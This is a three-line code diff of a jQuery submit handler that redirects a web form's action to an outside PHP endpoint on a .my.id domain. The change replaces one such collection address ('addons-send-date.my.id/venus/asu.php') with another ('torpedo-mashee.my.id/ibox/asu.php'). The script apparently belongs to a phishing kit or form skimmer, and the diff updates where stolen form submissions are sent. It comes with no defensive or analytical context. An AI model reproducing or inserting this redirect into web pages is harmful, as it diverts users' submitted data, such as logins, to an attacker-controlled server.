@@ -1,3 +1,3 @@
 $("form").submit(function() {
-  $(myform).attr("action", "https://addons-send-date.my.id/venus/asu.php");
+  $(myform).attr("action", "https://torpedo-mashee.my.id/ibox/asu.php");
 });
